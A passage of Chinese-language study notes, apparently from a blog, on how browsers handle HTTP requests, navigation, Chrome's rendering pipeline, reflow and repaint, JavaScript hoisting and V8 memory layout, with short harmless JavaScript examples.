连接</h3><p>TCP工作方式见上文。</p><h3 id="发送-HTTP-请求"><a href="#发送-HTTP-请求" class="headerlink" title="发送 HTTP 请求"></a>发送 HTTP 请求</h3><p>HTTP 中的数据正是在这个通信过程中传输的。</p><p><img src="https://i.loli.net/2021/06/13/j1Ys4IfaHC9wXoA.jpg" alt="Snipaste_2021-06-13_20-00-16.jpg"></p><p>首先浏览器会向服务器发送<strong>请求行</strong>，它包括了<strong>请求方法、请求 URI和 HTTP 版本协议</strong>。</p><p>请求行里最常用的请求方法是 <strong>Get/POST。</strong>在浏览器发送请求行命令之后，还要以<strong>请求头</strong>形式发送其他一些信息，把浏览器的一些基础信息告诉服务器。比如包含了浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie 信息，等等。</p><h2 id="服务器端处理-HTTP-请求流程"><a href="#服务器端处理-HTTP-请求流程" class="headerlink" title="服务器端处理 HTTP 请求流程"></a>服务器端处理 HTTP 请求流程</h2><h3 id="返回请求"><a href="#返回请求" class="headerlink" title="返回请求"></a>返回请求</h3><p><img src="https://i.loli.net/2021/06/13/qHVi3gnF8pmQLJE.jpg" alt="Snipaste_2021-06-13_20-02-54.jpg"></p><p>服务器会返回<strong>响应行</strong>，包括协议版本和状态码。且通过请求行的<strong>状态码</strong>来告诉浏览器它的处理结果。</p><p>服务器也会随同响应向浏览器发送<strong>响应头</strong>。响应头包含了服务器自身的一些信息，比如服务器生成返回数据的时间、返回的数据类型（JSON、HTML、流媒体等类型），以及服务器要在客户端保存的 Cookie 等信息。</p><p>发送完响应头后，服务器就可以继续发送<strong>响应体</strong>的数据，通常，响应体就包含了 HTML 的实际内容。</p><h3 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h3><p>通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了：<code>Connection:Keep-Alive</code> 那么 TCP 连接在发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。<strong>保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度</strong>。</p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>还有一种情况需要了解下，比如当在浏览器中打开 geekbang.org 后，会发现最终打开的页面地址是 <a href="https://www.geekbang.org./">https://www.geekbang.org。</a></p><p>此时服务器响应行返回的状态码是 301。状态 301 就是告诉浏览器，我需要重定向到另外一个网址，而需要重定向的网址正是包含在响应头的 Location 字段中，接下来，浏览器获取 Location 字段中的地址，并使用该地址重新导航，这就是一个完整重定向的执行流程。</p><h2 id="从输入URL到页面展示，发生了什么？（经典面试题）"><a href="#从输入URL到页面展示，发生了什么？（经典面试题）" class="headerlink" title="从输入URL到页面展示，发生了什么？（经典面试题）"></a>从输入URL到页面展示，发生了什么？（经典面试题）</h2><p>“从输入 URL 到页面展示完整流程示意图”：</p><p><img src="https://i.loli.net/2021/06/13/4dMoq38AcIE6xzO.jpg" alt="Snipaste_2021-06-13_20-08-17.jpg"></p><p>从图中可以看出，<strong>整个过程需要各个进程之间的配合。</strong>这个过程可以大致描述为如下：</p><ul><li>首先，用户从浏览器进程里<strong>输入请求信息</strong>；</li><li>然后，网络进程<strong>发起 URL 请求</strong>；</li><li>服务器响应 URL 请求之后，浏览器进程就又要开始<strong>准备渲染进程</strong>了；</li><li>渲染进程准备好之后，需要先向渲染进程提交页面数据，我们称之为<strong>提交文档</strong>阶段；</li><li>渲染进程接收完文档信息之后，便开始<strong>解析页面和加载子资源</strong>，完成页面的渲染。</li></ul><h3 id="1-用户输入"><a href="#1-用户输入" class="headerlink" title="1.用户输入"></a><strong>1.用户输入</strong></h3><p>当用户在地址栏中输入一个查询关键字时，地址栏会判断输入的关键字是<strong>搜索内容</strong>，还是<strong>请求的 URL</strong>。</p><ul><li>如果是搜索内容，地址栏会使用浏览器默认的搜索引擎，来合成新的带搜索关键字的 URL。</li><li>如果判断输入内容符合 URL 规则，比如输入的是 time.geekbang.org，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL，如 <a href="https://time.geekbang.org./">https://time.geekbang.org。</a></li></ul><p>当用户输入关键字并键入回车之后，浏览器标签页上的图标便进入了加载状态。但此时图中页面显示的<strong>依然是之前打开的页面内容</strong>，并没立即替换为极客时间的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p><h3 id="2-URL请求过程"><a href="#2-URL请求过程" class="headerlink" title="2.URL请求过程"></a><strong>2.URL请求过程</strong></h3><p>浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的 URL 请求流程。</p><p>首先，网络进程会查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如果在缓存中没有查找到资源，那么直接进入网络请求流程。这请求前的第一步是要进行 DNS 解析，以获取请求域名的服务器 IP 地址。如果请求协议是 HTTPS，那么还需要建立 TLS 连接。</p><p>接下来就是利用 IP 地址和服务器建立 TCP 连接。连接建立之后，浏览器端会构建请求行、请求头等信息，并把和该域名相关的 Cookie 等数据附加到请求头中，然后向服务器发送构建的请求信息。</p><p>服务器接收到请求信息后，会根据请求信息生成响应数据（包括响应行、响应头和响应体等信息），并发给网络进程。等网络进程接收了响应行和响应头之后，就开始解析响应头的内容了。</p><p><strong>（1）重定向</strong></p><p>在接收到服务器返回的响应头后，网络进程开始解析响应头，如果发现返回的状态码是 301 或者 302，那么说明服务器需要浏览器重定向到其他 URL。这时网络进程会从响应头的 Location 字段里面读取重定向的地址，然后再发起新的 HTTP 或者 HTTPS 请求。</p><p><strong>在导航过程中，如果服务器响应行的状态码包含了 301、302 一类的跳转信息，浏览器会跳转到新的地址继续导航；如果响应行是 200，那么表示浏览器可以继续处理该请求</strong>。</p><p><strong>（2）响应数据类型处理</strong></p><p><strong>Content-Type 是 HTTP 头中一个非常重要的字段， 它告诉浏览器服务器返回的响应体数据是什么类型</strong>，然后浏览器会根据 Content-Type 的值来决定如何显示响应体的内容。</p><p>如果 Content-Type 字段的值被浏览器判断为<strong>下载类型，那么该请求会被提交给浏览器的下载管理器，同时该 URL 请求的导航流程就此结束</strong>。但如果是<strong>HTML，那么浏览器则会继续进行导航流程</strong>。由于 Chrome 的页面渲染是运行在渲染进程中的，所以接下来就需要准备渲染进程了。</p><h3 id="3-准备渲染进程"><a href="#3-准备渲染进程" class="headerlink" title="3.准备渲染进程"></a><strong>3.准备渲染进程</strong></h3><p>默认情况下，Chrome 会为每个页面分配一个渲染进程。但是，也有一些例外，比如从极客时间的首页里面打开了另外一个页面——算法训练营，浏览器会让这两个页面直接运行在同一个渲染进程中。</p><p>Chrome 的默认策略是，每个标签对应一个渲染进程。但<strong>如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程</strong>。</p><p>渲染进程准备好之后，还不能立即进入文档解析状态，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段。</p><h3 id="4-提交文档"><a href="#4-提交文档" class="headerlink" title="4.提交文档"></a><strong>4.提交文档</strong></h3><p>这里的“文档”是指 URL 请求的响应体数据。</p><ul><li>“提交文档”的消息是由浏览器进程发出的，渲染进程接收到“提交文档”的消息后，会和网络进程建立传输数据的“<strong>管道</strong>”。</li><li>等文档数据传输完成之后，渲染进程会返回“<strong>确认提交</strong>”的消息给浏览器进程。</li><li>浏览器进程在收到“确认提交”的消息后，会<strong>更新浏览器界面状态</strong>，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 Web 页面。</li></ul><p>更新内容如下图所示：</p><p><img src="https://i.loli.net/2021/06/13/Nf2UvQTo6WeCsGi.jpg" alt="Snipaste_2021-06-13_20-22-46.jpg"></p><p>到这里，一个完整的导航流程就“走”完了，这之后就要进入渲染阶段了。</p><h3 id="5-渲染阶段"><a href="#5-渲染阶段" class="headerlink" title="5.渲染阶段"></a><strong>5.渲染阶段</strong></h3><p>一旦页面生成完成，渲染进程会发送一个消息给浏览器进程，浏览器接收到消息后，会停止标签图标上的加载动画。</p><h2 id="HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）"><a href="#HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）" class="headerlink" title="HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）"></a>HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）</h2><p>按照渲染的时间顺序，流水线可分为如下几个子阶段：构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。</p><h3 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 DOM 树</h3><p>为什么要构建 DOM 树呢？<strong>这是因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树</strong>。</p><p><img src="https://i.loli.net/2021/06/13/LmIKEagyHOruVZi.jpg" alt="Snipaste_2021-06-13_20-39-22.jpg"></p><p>从图中可以看出，构建 DOM 树的<strong>输入内容</strong>是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。</p><h3 id="样式计算"><a href="#样式计算" class="headerlink" title="样式计算"></a>样式计算</h3><p><strong>1. 把 CSS 转换为浏览器能够理解的结构</strong></p><p>CSS 样式来源主要有三种：</p><ul><li>通过 link 引用的外部 CSS 文件</li><li><code>&lt;style&gt;</code>标记内的 CSS</li><li>元素的 style 属性内嵌的 CSS</li></ul><p>和 HTML 文件一样，浏览器也是无法直接理解这些纯文本的 CSS 样式，所以<strong>当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——styleSheets</strong>。</p><p><strong>2. 转换样式表中的属性值，使其标准化</strong></p><p><img src="https://i.loli.net/2021/06/13/VmsIWR1Hybn7u9A.jpg" alt="Snipaste_2021-06-13_20-41-48.jpg"></p><p><strong>3. 计算出 DOM 树中每个节点的具体样式</strong></p><p><strong>涉及到 CSS 的继承规则和层叠规则。</strong></p><p>首先是 CSS 继承。<strong>CSS 继承就是每个 DOM 节点都包含有父节点的样式</strong>。</p><p><img src="https://i.loli.net/2021/06/13/YGTAELfPzvMa2Zp.jpg" alt="Snipaste_2021-06-13_20-43-10.jpg"></p><p>第二个规则是样式层叠。<strong>层叠是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位，CSS 的全称“层叠样式表”正是强调了这一点</strong>。</p><h3 id="布局阶段"><a href="#布局阶段" class="headerlink" title="布局阶段"></a>布局阶段</h3><p>接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局。</p><p>Chrome 在布局阶段需要完成两个任务：创建布局树和布局计算。</p><p><strong>1. 创建布局树</strong></p><p>可能注意到 DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 display:none 属性的元素。所以<strong>在显示之前，我们还要额外地构建一棵只包含可见元素布局树</strong>。</p><p>结合下图来看看布局树的构造过程：</p><p><img src="https://i.loli.net/2021/06/13/gesREVjatk6wPN4.jpg" alt="Snipaste_2021-06-13_20-45-17.jpg"></p><p>从上图可以看出，DOM 树中所有不可见的节点都没有包含到布局树中。为了构建布局树，浏览器大体上完成了下面这些工作：</p><ul><li>遍历 DOM 树中的所有可见节点，并把这些节点加到布局中；</li><li>而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 body.p.span 这个元素，因为它的属性包含 dispaly:none，所以这个元素也没有被包进布局树。</li></ul><p><strong>2. 布局计算</strong></p><h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树</strong>（LayerTree）。</p><p><strong>浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面</strong>。</p><p><img src="https://i.loli.net/2021/06/13/rMFSTGNwhkUxDHz.jpg" alt="Snipaste_2021-06-13_20-53-15.jpg"></p><p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层</strong>。如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p><p><strong>满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</strong></p><p><strong>第一点，拥有层叠上下文属性的元素会被提升为单独的一层。</strong>页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。<strong>明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素</strong>等，都拥有层叠上下文属性。</p><p><strong>第二点，需要剪裁（clip）的地方也会被创建为图层。</strong>（div限制，放不下了）出现裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。可以参考下图：</p><p><img src="https://i.loli.net/2021/06/13/8PVsfkMCbJwLpQF.jpg" alt="Snipaste_2021-06-13_20-55-26.jpg"></p><h3 id="图层绘制"><a href="#图层绘制" class="headerlink" title="图层绘制"></a>图层绘制</h3><p>完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制。渲染引擎会把一个图层的绘制拆分成很多小的<strong>绘制指令</strong>，然后再把这些指令按照顺序组成一个待绘制列表。绘制列表中的指令非常简单，因此绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。</p><h3 id="栅格化（raster）操作"><a href="#栅格化（raster）操作" class="headerlink" title="栅格化（raster）操作"></a>栅格化（raster）操作</h3><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。可以结合下图来看下渲染主线程和合成线程之间的关系：</p><p><img src="https://i.loli.net/2021/06/13/CebMaRv9WpDYjxg.jpg" alt="Snipaste_2021-06-13_21-01-32.jpg"></p><p>当图层的绘制列表准备好之后，主线程会把该绘制列表<strong>提交</strong>给合成线程。通常一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做<strong>视口</strong></p><p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p><p>基于这个原因，<strong>合成线程会将图层划分为图块（tile）</strong>，这些图块的大小通常是 256x256 或者 512x512，如下图所示：</p><p><img src="https://i.loli.net/2021/06/13/6y39hZ8vjKBFrVS.jpg" alt="Snipaste_2021-06-13_21-02-44.jpg"></p><p>然后<strong>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图</strong>。而图块是栅格化执行的最小单位。渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p><p><img src="https://i.loli.net/2021/06/13/F7UPtWLOjM4eQzI.jpg" alt="Snipaste_2021-06-13_21-08-02.jpg"></p><p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p><h3 id="合成和显示"><a href="#合成和显示" class="headerlink" title="合成和显示"></a>合成和显示</h3><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。</p><p>浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p><h3 id="渲染流水线大总结"><a href="#渲染流水线大总结" class="headerlink" title="渲染流水线大总结"></a>渲染流水线大总结</h3><p><img src="https://i.loli.net/2021/06/13/f4ZzuGRy2SKVqbN.jpg" alt="Snipaste_2021-06-13_21-09-36.jpg"></p><p>结合上图，一个完整的渲染流程大致可总结为如下：</p><ol><li>渲染进程将 HTML 内容转换为能够读懂的<strong>DOM 树</strong>结构。</li><li>渲染引擎将 CSS 样式表转化为浏览器可以理解的<strong>styleSheets</strong>，计算出 DOM 节点的样式。</li><li>创建<strong>布局树</strong>，并计算元素的布局信息。</li><li>对布局树进行分层，并生成<strong>分层树</strong>。</li><li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li><li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程池</strong>中将图块转换成位图。</li><li>合成线程发送绘制图块命令<strong>DrawQuad</strong>给浏览器进程。</li><li>浏览器进程根据 DrawQuad 消息<strong>生成页面</strong>，并<strong>显示</strong>到显示器上。</li></ol><h3 id="1-概念——重排（更新了元素的几何属性）"><a href="#1-概念——重排（更新了元素的几何属性）" class="headerlink" title="1. 概念——重排（更新了元素的几何属性）"></a>1. 概念——重排（更新了元素的几何属性）</h3><p><img src="https://i.loli.net/2021/06/13/Ni7Q8rkXM1P6sLb.jpg" alt="Snipaste_2021-06-13_21-10-59.jpg"></p><p>如果通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫<strong>重排</strong>。无疑，<strong>重排需要更新完整的渲染流水线，所以开销也是最大的</strong>。</p><h3 id="2-概念——重绘（更新元素的绘制属性）"><a href="#2-概念——重绘（更新元素的绘制属性）" class="headerlink" title="2. 概念——重绘（更新元素的绘制属性）"></a>2. 概念——重绘（更新元素的绘制属性）</h3><p><img src="https://i.loli.net/2021/06/13/Xd5g8YJPq3iVwv2.jpg" alt="Snipaste_2021-06-13_21-12-08.jpg"></p><p>从图中可以看出，如果修改了元素的背景颜色，那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫<strong>重绘</strong>。相较于重排操作，<strong>重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些</strong>。</p><h3 id="3-概念——合成"><a href="#3-概念——合成" class="headerlink" title="3. 概念——合成"></a>3. 概念——合成</h3><p>如果更改一个既不要布局也不要绘制的属性，渲染引擎将跳过布局和绘制，只执行后续的合成操作，我们把这个过程叫做<strong>合成</strong>。</p><p><img src="https://i.loli.net/2021/06/13/riV1bC6JFjwvLZK.jpg" alt="Snipaste_2021-06-13_21-13-06.jpg"></p><p>使用 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以<strong>相对于重绘和重排，合成能大大提升绘制效率</strong>。</p><hr><h1 id="浏览器中的JavaScript执行机制"><a href="#浏览器中的JavaScript执行机制" class="headerlink" title="浏览器中的JavaScript执行机制"></a>浏览器中的JavaScript执行机制</h1><h2 id="执行上下文"><a href="#执行上下文" class="headerlink" title="执行上下文"></a><strong>执行上下文</strong></h2><ol><li>在执行过程中，若使用了未声明的变量，那么 JavaScript 执行会报错。</li><li>在一个变量定义之前使用它，不会出错，但是该变量的值会为 undefined，而不是定义时的值。</li><li>在一个函数定义之前使用它，不会出错，且函数能正确执行。</li></ol><h2 id="变量提升（Hoisting）"><a href="#变量提升（Hoisting）" class="headerlink" title="变量提升（Hoisting）"></a>变量提升（Hoisting）</h2><p><img src="https://i.loli.net/2021/06/13/gQsNIO3vzcDpZSq.jpg" alt="Snipaste_2021-06-13_21-35-36.jpg"></p><p>上面是<strong>变量</strong>的声明和赋值，下面是<strong>函数</strong>的声明和赋值</p><p><img src="https://i.loli.net/2021/06/13/TBXObM38ZhgsrlV.jpg" alt="Snipaste_2021-06-13_21-36-23.jpg"></p><p>所谓的<strong>变量提升</strong>，是指在 JavaScript 代码执行过程中，JavaScript 引擎把变量的声明部分和函数的声明部分提升到代码开头的“行为”。变量被提升后，会给变量设置默认值，这个默认值就是我们熟悉的 undefined。</p><h2 id="JavaScript-代码的执行流程"><a href="#JavaScript-代码的执行流程" class="headerlink" title="JavaScript 代码的执行流程"></a>JavaScript 代码的执行流程</h2><p>从概念的字面意义上来看，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面。但<strong>实际上变量和函数声明在代码里的位置是不会改变的，而是在编译阶段被 JavaScript 引擎放入内存中</strong>。一段 JavaScript 代码在执行之前需要被 JavaScript 引擎编译，<strong>编译</strong>完成之后，才会进入<strong>执行</strong>阶段。</p><p><img src="https://i.loli.net/2021/06/13/tGEw7LNHFIBqYcb.jpg" alt="Snipaste_2021-06-13_21-38-29.jpg"></p><h3 id="1-编译阶段"><a href="#1-编译阶段" class="headerlink" title="1. 编译阶段"></a><strong>1. 编译阶段</strong></h3><p><img src="https://i.loli.net/2021/06/13/bIClNV2394fLiXB.jpg" alt="Snipaste_2021-06-13_21-39-32.jpg"></p><p>输入一段代码，经过编译后，会生成两部分内容：<strong>执行上下文（Execution context）和可执行代码</strong>。</p><p><strong>执行上下文是 JavaScript 执行一段代码时的运行环境</strong>，比如调用一个函数，就会进入这个函数的执行上下文，确定该函数在执行期间用到的诸如 this、变量、对象以及函数等。</p><h3 id="2-执行阶段"><a href="#2-执行阶段" class="headerlink" title="2. 执行阶段"></a><strong>2. 执行阶段</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line"><span class="built_in">console</span>.log(myname)</span><br><span class="line"><span class="keyword">var</span> myname = <span class="string">&#x27;极客时间&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;函数 showName 被执行&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>当执行到 showName 函数时，JavaScript 引擎便开始在变量环境对象中查找该函数，由于变量环境对象中存在该函数的引用，所以 JavaScript 引擎便开始执行该函数，并输出“函数 showName 被执行”结果。</p></li><li><p>接下来打印“myname”信息，JavaScript 引擎继续在变量环境对象中查找该对象，由于变量环境存在 myname 变量，并且其值为 undefined，所以这时候就输出 undefined。</p></li><li><p>接下来执行第 3 行，把“极客时间”赋给 myname 变量，赋值后变量环境中的 myname 属性值改变为“极客时间”，变量环境如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VariableEnvironment:</span><br><span class="line">     myname -&gt; &quot; 极客时间 &quot;, </span><br><span class="line">     showName -&gt;function : &#123;console.log(myname)</span><br></pre></td></tr></table></figure></li></ul><h2 id="代码中出现相同的变量或者函数怎么办？"><a href="#代码中出现相同的变量或者函数怎么办？" class="headerlink" title="代码中出现相同的变量或者函数怎么办？"></a>代码中出现相同的变量或者函数怎么办？</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;极客邦&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">showName();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;极客时间&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">showName(); </span><br></pre></td></tr></table></figure><ul><li><strong>首先是编译阶段</strong>。遇到了第一个 showName 函数，会将该函数体存放到变量环境中。接下来是第二个 showName 函数，继续存放至变量环境中，但是变量环境中已经存在一个 showName 函数了，此时，<strong>第二个 showName 函数会将第一个 showName 函数覆盖掉</strong>。这样变量环境中就只存在第二个 showName 函数了。</li><li><strong>接下来是执行阶段</strong>。先执行第一个 showName 函数，但由于是从变量环境中查找 showName 函数，而变量环境中只保存了第二个 showName 函数，所以最终调用的是第二个函数，打印的内容是“极客时间”。第二次执行 showName 函数也是走同样的流程，所以输出的结果也是“极客时间”。</li></ul><p>综上，<strong>一段代码如果定义了两个相同名字的函数，那么最终生效的是最后一个函数</strong>。</p><h2 id="为什么JavaScript代码会出现栈溢出？"><a href="#为什么JavaScript代码会出现栈溢出？" class="headerlink" title="为什么JavaScript代码会出现栈溢出？"></a>为什么JavaScript代码会出现栈溢出？</h2><p>**明确:**哪些情况下代码才算是“一段”代码，才会在执行之前就进行编译并创建执行上下文。一般说来，有这么三种情况：</p><ol><li>当 JavaScript 执行全局代码的时候，会编译全局代码并创建全局执行上下文，而且在整个页面的生存周期内，全局执行上下文只有一份。</li><li>当调用一个函数的时候，函数体内的代码会被编译，并创建函数执行上下文，一般情况下，函数执行结束之后，创建的函数执行上下文会被销毁。</li><li>当使用 eval 函数的时候，eval 的代码也会被编译，并创建执行上下文。</li></ol><p>JavaScript 中有很多函数，经常会出现在一个函数中调用另外一个函数的情况，<strong>调用栈就是用来管理函数调用关系的一种数据结构</strong>。</p><h3 id="什么是函数调用"><a href="#什么是函数调用" class="headerlink" title="什么是函数调用"></a>什么是函数调用</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">10</span></span><br><span class="line"><span class="keyword">return</span>  a+b</span><br><span class="line">&#125;</span><br><span class="line">add()</span><br></pre></td></tr></table></figure><p>决定暂时不整理这一块的笔记，主要还是浏览器的知识吧。（因为感觉像把老师说的都复制了一边= ）</p><hr><h1 id="V8工作原理"><a href="#V8工作原理" class="headerlink" title="V8工作原理"></a>V8工作原理</h1><p>这里主要介绍<strong>JavaScript 的内存机制。</strong></p><h2 id="数据在内存中的存放"><a href="#数据在内存中的存放" class="headerlink" title="数据在内存中的存放"></a>数据在内存中的存放</h2><h3 id="JavaScript-的语言类型"><a href="#JavaScript-的语言类型" class="headerlink" title="JavaScript 的语言类型"></a>JavaScript 的语言类型</h3><p>JavaScript 是<strong>动态语言</strong>，因为在声明变量之前并不需要确认其数据类型；也是<strong>弱类型语言</strong>，因为它支持隐式类型转换。<strong>（动态弱类型）</strong></p><h3 id="JavaScript-的数据类型"><a href="#JavaScript-的数据类型" class="headerlink" title="JavaScript 的数据类型"></a>JavaScript 的数据类型</h3><p>JavaScript 中的数据类型一种有 8 种，它们分别是：</p><p><img src="https://i.loli.net/2021/06/14/Lx2RKzPS3FybiaH.jpg" alt="Snipaste_2021-06-14_15-44-28.jpg"></p><p>有三点需要注意：</p><p>第一点，使用 typeof 检测 Null 类型时，返回的是 Object。这是当初 JavaScript 语言的一个 Bug，一直保留至今，之所以一直没修改过来，主要是为了兼容老的代码。</p><p>第二点，Object 类型比较特殊，它是由上述 7 种类型组成的一个包含了 key-value 对的数据类型。如下所示：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myObj = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;极客时间&#x27;</span>,</span><br><span class="line">    <span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;....&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 vaule 可以是任何类型，包括函数，这也就意味着可以通过 Object 来存储函数，Object 中的函数又称为方法</p><p>第三点，我们把前面的 7 种数据类型称为<strong>原始类型</strong>，把最后一个对象类型称为<strong>引用类型</strong></p><h3 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h3><p><img src="https://i.loli.net/2021/06/14/cUdWrQKFxCw6jn7.jpg" alt="Snipaste_2021-06-14_15-46-52.jpg"></p><p>在 JavaScript 的执行过程中， 主要有三种类型内存空间，分别是<strong>代码空间、栈空间</strong>和<strong>堆空间</strong>。</p><p>参考如下代码段：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">&quot; 极客时间 &quot;</span></span><br><span class="line">    <span class="keyword">var</span> b = a</span><br><span class="line">    <span class="keyword">var</span> c = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客时间 &quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> d = c</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>当执行一段代码时，需要先编译，并创建执行上下文，然后再按照顺序执行代码。当执行到第 3 行时，变量 a 和变量 b 的值都被保存在执行上下文中，而执行上下文又被压入到栈中，所以也可以认为变量 a 和变量 b 的值都是存放在栈中的。执行第 4 行代码，由于 JavaScript 引擎判断右边的值是一个引用类型，这时候JavaScript 引擎会将它分配到堆空间里面，分配后该对象会有一个在“堆”中的地址，然后再将该数据的地址写进 c 的变量值，最终分配好内存的示意图如下所示：</p><p><img src="https://i.loli.net/2021/06/14/k3yoZitJHrPqD45.jpg" alt="Snipaste_2021-06-14_15-52-29.jpg"></p><p>因此，<strong>对象类型</strong>是存放在<strong>堆空间</strong>的，在栈空间中只是保留了<strong>对象的引用地址</strong>，当 JavaScript 需要访问该数据的时候，通过栈中的引用地址来访问。即：<strong>原始类型的数据值都是直接保存在“栈”中的，引用类型的值是存放在“堆”中的。</strong></p><blockquote><p>为什么一定要分“堆”和“栈”两个存储空间？</p></blockquote><p>因为 JavaScript 引擎需要用栈来维护程序执行期间上下文的状态，如果栈空间大了话，所有的数据都存放在栈空间里面，那么会影响到上下文切换的效率，进而又影响到整个程序的执行效率。比如文中的 foo 函数执行结束了，JavaScript 引擎需要离开当前的执行上下文，只需要将指针下移到上个执行上下文的地址就可以了，foo 函数执行上下文栈区空间全部回收，具体过程可以参考下图：</p><p><img 